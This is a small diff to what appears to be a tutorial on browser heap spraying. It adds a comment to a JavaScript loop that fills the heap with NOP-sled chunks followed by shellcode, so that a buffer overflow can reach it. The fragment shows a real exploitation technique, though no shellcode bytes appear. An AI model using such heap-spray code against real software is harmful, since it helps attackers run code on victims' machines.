@@ -262,6 +262,7 @@ And it would increase the possibility for buffer overflow to execute those shell
         
       while (chunk.length + slack < 0x40000) chunk = chunk + chunk + filler;
       var memory = new Array();
+      // The goal is to fill the heap with sequences of NOP's + Shellcode.
       for (i = 0; i < 500; i++){ memory[i] = chunk + Shellcode }
 
       alert("allocation done");
